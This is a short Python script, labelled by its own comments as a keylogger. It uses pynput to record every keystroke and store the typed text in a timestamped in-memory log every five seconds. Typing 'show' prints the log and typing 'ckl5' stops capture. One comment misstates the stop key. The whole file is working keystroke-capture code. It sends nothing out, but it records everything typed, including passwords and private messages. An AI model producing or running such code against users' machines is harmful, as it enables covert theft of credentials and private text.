from pynput import keyboard
import threading
from time_stamp import *
from print_text import *

input_keys = []
all_keys = []
memory = {}

def on_press(key):
    try:
        input_keys.append(key.char)
        all_keys.append(key.char)
    except:
        if str(key) == 'Key.space':
            input_keys.append(' ')
        elif str(key) == 'Key.enter':
            input_keys.append('\n')
        else:
            pass
###     stop monitoring or show memory     ###
def on_release(key):
    try:
        show = all_keys[-4:] == ['s','h','o','w'] or input_keys[-4:] == ['s','h','o','w']
        stop = all_keys[-4:] == ['c','k','l','5'] or input_keys[-4:] == ['c','k','l','5']
        if show:
        ###     enter 'show' to view the last memory keys       ###
            for i in range(4):
                input_keys.pop()
            # output_text = "".join(input_keys)
            # print_text(output_text)
            # print_memory()
            print(memory)
            print_memory()
        ###     press "c + k" to stop monitoring       ###
        elif stop:
            for i in range(4):
                input_keys.pop()
            print_text('monitoring is stoped !')
            return False
        else:
            pass
    except:
        pass


def save_to_memory():
    global input_keys, memory
    if input_keys:
        text = "".join(input_keys)
        memory[time_stamp()] = text
        input_keys = []
    ### timer   ###
    threading.Timer(5, save_to_memory).start()


###     print memory        ###
def print_memory():
    try:
        if memory:
            text = 'memory' + '\n' * 3
            for i in memory:
                text += i
            print_text(str(text))
        else:
            print_text('no text!')
    except:
        print_text('Error')


###     keyboard listener      ###
def listener():
    save_to_memory()
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


### run KeyLogger       ###
if __name__ == '__main__':
    listener()